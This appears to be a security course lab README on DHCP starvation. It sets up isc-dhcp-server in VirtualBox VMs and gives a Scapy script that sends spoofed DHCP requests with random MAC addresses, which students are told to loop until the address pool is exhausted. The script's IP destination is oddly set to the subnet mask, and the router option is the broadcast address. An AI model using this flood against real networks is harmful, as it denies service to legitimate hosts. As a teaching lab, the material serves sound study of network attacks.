# DHCP Starvation Lab
![](https://img.shields.io/badge/license-Apache--2.0-brightgreen.svg) ![](https://img.shields.io/badge/requirements-Scapy-red.svg)

In this lab we will use [Kali](https://www.kali.org), [Ubuntu](https://www.ubuntu.com) & [Scapy](https://scapy.net/). 

## Lab Overview
### The Dynamic Host Configuration Protocol (DHCP)
DHCP is a network management protocol used on UDP/IP networks whereby a DHCP server dynamically assigns an IP address and other network configuration parameters to each device on a network so they can communicate with other IP networks.

When a client system without an IP address enters a network it will request an IP address from the resident DHCP server. The DHCP server will reserve an IP address (so anyone else asking for one is not granted this one) and it will send that IP address to the device along with a lease identifying how long the address will be valid. Normally, from this point, the device will respond by confirming the IP address with the DHCP server and the DHCP server finally responds with an acknowledgement.

### The DHCP Starvation
Once the adversary receives the IP address and the lease period from the DHCP server, the adversary does not respond with the confirmation. Instead, the adversary floods the DHCP server with IP address requests until all addresses within the server’s address space have been reserved (exhausted). At this point, any hosts wishing to join the network will be denied access, resulting in a denial of service.

## Lab Environment
If [VirtualBox](https://www.virtualbox.org) is not installed on your computer, install it now.<br>

- DHCP Server (Ubuntu):<br>
  ```
  VBoxManage startvm "Ubuntu"
  ```
- Client (Ubuntu 16.04 VM):<br>
  ```
  VBoxManage startvm "Ubuntu-16-04"
  ```
- Attacker (Kali 64bit VM):<br>
  ```
  VBoxManage startvm "Kali-64bit"
  ```

![](Images/dhcp_spoofing.jpgggggg)

## Configure the DHCP Server
For the DHCP server, we need to run a DHCP server program.<br>
The most widely used DHCP server software is called isc-dhcp-server.

### 1. Updating package tree in Ubuntu
In order to install an isc-dhcp-server in Kali Linux.<br>
First, we need to make sure the package tree is up –to-date with the latest software versions by issuing the below command.<br>
```sh
$ sudo apt-get update
```

### 2. Installing DHCP Server in Ubuntu
Run the command below to install the DCHP server package, which was formerly known as dhcp3-server.<br>
```sh
$ sudo apt install isc-dhcp-server
```

When the installation completes, edit the file `/etc/default/isc-dhcp-server` to define the interfaces DHCPD should use to serve DHCP requests, with the INTERFACES option.<br>
For example, if you want the DHCPD daemon to listen on eth0, set it:<br>
```
INTERFACES="eth0"
```

### 3. Configuring DHCP Server in Ubuntu
The main DHCP configuration file is `/etc/dhcp/dhcpd.conf`, you must add all your network information to be sent to clients here.
And, there are two types of statements defined in the DHCP configuration file, these are:

- parameters – specify how to perform a task, whether to carry out a task, or what network configuration options to send to the DHCP client.<br>
- declarations – define the network topology, state the clients, offer addresses for the clients, or apply a group of parameters to a group of declarations.

Now, open and modify the main configuration file, define your DHCP server options:<br>
```sh
$ sudo nano /etc/dhcp/dhcpd.conf
```

Set the following global parameters at the top of the file, they will apply to all the declarations below (do specify values that apply to your scenario):<br>
```
default-lease-time 600;
max-lease-time 7200;
authoritative;
```

Now, define a subnetwork; here, we’ll setup DHCP for 10.0.0.0/24 LAN network (use parameters that apply to your scenario).<br>
```
subnet 10.0.0.0 netmask 255.255.255.0 {
    range 10.0.0.100 10.0.0.200;
    option routers 10.0.0.255;
    option subnet-mask 255.255.255.0;
    option broadcast-address 10.0.0.255;
    default-lease-time 600;
    max-lease-time 7200;
}
```

Next, start the DHCP service for the time being, and enable it to start automatically from the next system boot, like so:<br>
```sh
$ sudo systemctl start isc-dhcp-server
```
```sh
$ sudo systemctl enable isc-dhcp-server
```
To check if server is running:
```sh
$ sudo systemctl status isc-dhcp-server
```

## Configuring DHCP Client Machines (Ubuntu and Kali)
At this point, you can configure your clients computers on the network to automatically receive IP addresses from the DHCP server.
Login to the client computers and edit the Ethernet interface configuration file as follows (take note of the interface name/number):<br>
```sh
$ sudo nano /etc/network/interfaces
```

And define the options below:<br>
```
auto eth0
iface eth0 inet dhcp
```
Save the file and exit.<br>

**NOTE**: Do it for Client (Ubuntu 16.04 VM) and Attacker (Kali 64bit VM)

And restart network services like so (or reboot the system):<br>
```sh
$ sudo systemctl restart networking
```

**NOTE**: Only for Attacker (Kali 64bit VM)

## Lab Tasks

### Task 1: Configure the `run_script` (Attacker).

Download the git repository to the Attacker VM:
```sh
$ git clone https://github.com/sagikandleker/DHCP-Starvation-Lab
```

Use parameters that apply to your scenario:
```py
ip_address_subnet = "The IP you want to request from 10.0.0.100-10.0.0.200", For example - "10.0.0.150"
subnet_mask = "Your subnet mask", For example - "255.255.255.0"
dhcp_ip_address = "IP of DHCP Server", For example - "10.0.0.50"
```
Save the file and exit.

### Task 2: Run `run_script`.
In this task, the attacker sends a DHCP query request to the victim DHCP server.

**NOTE**: Run [Wireshark](https://www.wireshark.org/download.html) in parallel to watch the traffic.

```sh
$ chmod 755 run_script.py
```
```sh
$ python run_script.py
```
```py
from scapy.all import *

def main():
	broadcast = "ff:ff:ff:ff:ff:ff"
	conf.checkIPaddr = False
	ip_address_subnet = "10.0.0.120"
	subnet_mask = "255.255.255.0"
	dhcp_ip_address = "10.0.0.50"

	bogus_mac_address = RandMAC()
	dhcp_request = Ether(src=bogus_mac_address, dst=broadcast)/IP(src="0.0.0.0", dst=subnet_mask)/UDP(sport=68, dport=67)/BOOTP(chaddr=bogus_mac_address)/DHCP(options=[("message-type","request"),("server_id",dhcp_ip_address),("requested_addr", ip_address_subnet),"end"])

	sendp(dhcp_request)
	print "Requesting: " + ip_address_subnet + "\n"

if __name__=="__main__":
    main()
```
### Task 2.1: Run `dhcp-lease-list` on DHCP server.
Describe what do you see?

### Task 3: Improve `run_script`.
Now that we understand how to spoof our own DHCP packet, lets improve our code!
### Task 3.1: Loop it!
Modify our run_script to send spoofed DHCP requests in a loop!<br>
**NOTE**: Run [Wireshark](https://www.wireshark.org/download.html) in parallel to watch the traffic.
### Task 4: Did it work?
In this task, we will use the Client (Ubuntu 16.04 VM) to see if the attack was successful.
```sh
$ sudo systemctl restart networking
```
If the Client fails to receive IP from the DHCP server our attack was successful.<br>
### Task 4.1: Think outside the box.
Think of another way to check whether the attack was successful.<br>

## Submission
You need to submit a detailed lab report, with screenshots, to describe what you have done and what you have observed.<br>
You also need to provide explanation to the observations that are interesting or surprising.<br>
Please also list the important code snippets followed by explanation.<br>
Simply attaching code without any explanation will not receive credits.
